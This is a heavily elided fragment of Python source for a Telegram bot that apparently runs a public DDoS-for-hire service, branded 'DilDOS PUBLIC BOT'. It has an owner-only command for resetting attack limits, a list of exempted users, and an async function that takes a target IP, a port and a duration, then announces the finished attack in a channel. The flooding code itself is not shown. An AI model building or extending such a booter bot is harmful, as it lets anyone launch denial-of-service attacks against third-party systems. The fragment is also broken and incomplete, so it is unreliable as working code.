...
CHANNEL_ID = '-1002515013683'  # Replace with your specific channel or group ID
# Initialize the bot
...
EXEMPTED_USERS = [930577300, 2007860433]
...
# 🔄 『 𝑹𝒆𝒔𝒆𝒕 𝑨𝒕𝒕𝒂𝒄𝒌 𝑳𝒊𝒎𝒊𝒕𝒔 』🔄
@bot.message_handler(commands=['reset_PUSCHO'])
def reset_attack_limit(message):
    owner_id = 930577300  # Replace with the actual owner ID
...
async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
    try:
        ...
        bot.send_message(CHANNEL_ID, f"🌊𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗🌊\n\n𝐓𝐀𝐑𝐆𝐄𝐓 -> {target_ip}\n𝐏𝐎𝐑𝐓 -> {target_port}  𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅ \n[ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝗣𝗬𝗦𝗖𝗛𝗢 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗣𝗨𝗕𝗟𝗶𝗖 𝗕𝗢𝗧")
    except Exception as e:
